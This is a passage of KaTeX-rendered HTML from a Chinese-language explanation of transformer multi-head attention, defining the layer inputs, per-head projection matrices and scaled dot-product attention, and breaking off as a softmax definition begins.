style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3391734999999998em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>F</mi><mi>l</mi></msup></mrow><annotation encoding=\"application/x-tex\">F^l</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.849108em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span></span></span> 是第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi></mrow><annotation encoding=\"application/x-tex\">l</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span></span></span></span> 层的输入</li>\n<li>当<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">l=0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span> 的时候我们设<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>F</mi><mn>0</mn></msup><mo>=</mo><msub><mi>E</mi><mi>I</mi></msub></mrow><annotation encoding=\"application/x-tex\">F^0=E_I</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></li>\n<li>投影矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>Q</mi></msubsup><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi><mi mathvariant=\"normal\">/</mi><mi>h</mi></mrow></msup><mo separator=\"true\">,</mo><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>K</mi></msubsup><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi><mi mathvariant=\"normal\">/</mi><mi>h</mi></mrow></msup><mo separator=\"true\">,</mo><msubsup><mi mathvariant=\"bold\">W</mi><mi>V</mi><mi>Q</mi></msubsup><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi><mi mathvariant=\"normal\">/</mi><mi>h</mi></mrow></msup><mrow><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">n</mi><mi mathvariant=\"normal\">d</mi></mrow><msup><mi mathvariant=\"bold\">W</mi><mi>O</mi></msup><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbf{W}_{i}^{Q}\\in\\mathbb{R}^{d\\times d/h},\\mathbf{W}_{i}^{K}\\in\\mathbb{R}^{d\\times d/h},\\mathbf{W}_{V}^{Q}\\in\\mathbb{R}^{d\\times d/h} \\mathrm{and} \\mathbf{W}^{O}\\in\\mathbb{R}^{d\\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.236103em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.959239em;\"><span style=\"top:-2.4231360000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.1809080000000005em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">Q</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.146664em;vertical-align:-0.258664em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span><span class=\"mord mtight\">/</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.441336em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.258664em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.25277em;vertical-align:-0.293531em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span><span class=\"mord mtight\">/</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.959239em;\"><span style=\"top:-2.4064690000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span><span style=\"top:-3.1809080000000005em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">Q</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.293531em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9270999999999999em;vertical-align:-0.0391em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span><span class=\"mord mtight\">/</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\">n</span><span class=\"mord mathrm\">d</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">O</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8491079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 是每个注意力头对应的可学习参数</li>\n</ul>\n</li>\n<li>\n<p>注意力函数通过缩放的点积运算实现：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mrow><mi mathvariant=\"normal\">A</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">n</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">i</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">n</mi></mrow><mo stretchy=\"false\">(</mo><mi mathvariant=\"bold\">Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"bold\">K</mi><mo separator=\"true\">,</mo><mi mathvariant=\"bold\">V</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mrow><mi mathvariant=\"normal\">s</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">f</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">x</mi></mrow><mo stretchy=\"false\">(</mo><mfrac><msup><mrow><mi mathvariant=\"bold\">Q</mi><mi mathvariant=\"bold\">K</mi></mrow><mi mathvariant=\"normal\">⊤</mi></msup><msqrt><mrow><mi>d</mi><mi mathvariant=\"normal\">/</mi><mi>h</mi></mrow></msqrt></mfrac><mo stretchy=\"false\">)</mo><mi mathvariant=\"bold\">V</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">\\mathrm{Attention}(\\mathbf{Q},\\mathbf{K},\\mathbf{V})=\\mathrm{softmax}(\\frac{\\mathbf{QK}^{\\top}}{\\sqrt{d/h}})\\mathbf{V},\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">A</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">n</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">i</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">n</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathbf\">Q</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">K</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">V</span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.732118em;vertical-align:-1.13em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">s</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\" style=\"margin-right:0.07778em;\">f</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\">x</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.602118em;\"><span style=\"top:-2.175em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.935em;\"><span class=\"svg-align\" style=\"top:-3.2em;\"><span class=\"pstrut\" style=\"height:3.2em;\"></span><span class=\"mord\" style=\"padding-left:1em;\"><span class=\"mord mathnormal\">d</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">h</span></span></span><span style=\"top:-2.8950000000000005em;\"><span class=\"pstrut\" style=\"height:3.2em;\"></span><span class=\"hide-tail\" style=\"min-width:1.02em;height:1.28em;\"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119\nc34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120\nc340,-704.7,510.7,-1060.3,512,-1067\nl0 -0\nc4.7,-7.3,11,-11,19,-11\nH40000v40H1012.3\ns-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232\nc-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1\ns-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26\nc-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z\nM1001 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30499999999999994em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">Q</span><span class=\"mord mathbf\">K</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9251179999999999em;\"><span style=\"top:-3.1390100000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">⊤</span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.13em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">V</span></span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<ul>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"bold\">Q</mi><mo>=</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>Q</mi></msubsup><mo separator=\"true\">,</mo><mi mathvariant=\"bold\">K</mi><mo>=</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>K</mi></msubsup><mo separator=\"true\">,</mo><mrow><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">n</mi><mi mathvariant=\"normal\">d</mi></mrow><mi mathvariant=\"bold\">V</mi><mo>=</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>V</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">\\mathbf{Q} = \\mathbf{F}^{l}\\mathbf{W}_{i}^{Q} , \\mathbf{K} = \\mathbf{F}^{l}\\mathbf{W}_{i}^{K} , \\mathrm{and} \\mathbf{V} = \\mathbf{F}^{l}\\mathbf{W}_{i}^{V}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8805499999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">Q</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.236103em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.959239em;\"><span style=\"top:-2.4231360000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.1809080000000005em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">Q</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">K</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.107772em;vertical-align:-0.258664em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.441336em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.258664em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\">n</span><span class=\"mord mathrm\">d</span></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">V</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.107772em;vertical-align:-0.258664em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.441336em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.258664em;\"><span></span></span></span></span></span></span></span></span></span> 是输入嵌入矩阵的线性变换，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msqrt><mrow><mi>d</mi><mi mathvariant=\"normal\">/</mi><mi>h</mi></mrow></msqrt></mrow><annotation encoding=\"application/x-tex\">\\sqrt {d/h}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.24em;vertical-align:-0.30499999999999994em;\"></span><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.935em;\"><span class=\"svg-align\" style=\"top:-3.2em;\"><span class=\"pstrut\" style=\"height:3.2em;\"></span><span class=\"mord\" style=\"padding-left:1em;\"><span class=\"mord mathnormal\">d</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">h</span></span></span><span style=\"top:-2.8950000000000005em;\"><span class=\"pstrut\" style=\"height:3.2em;\"></span><span class=\"hide-tail\" style=\"min-width:1.02em;height:1.28em;\"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119\nc34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120\nc340,-704.7,510.7,-1060.3,512,-1067\nl0 -0\nc4.7,-7.3,11,-11,19,-11\nH40000v40H1012.3\ns-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232\nc-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1\ns-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26\nc-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z\nM1001 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30499999999999994em;\"><span></span></span></span></span></span></span></span></span> 是比例因子，避免内积的值过大。</p>\n</li>\n<li>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>公式定义</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>给定一个实数向量 </mtext><mi mathvariant=\"bold\">z</mi><mo>=</mo><mo stretchy=\"false\">[</mo><msub><mi>z</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>z</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>…</mo><mo 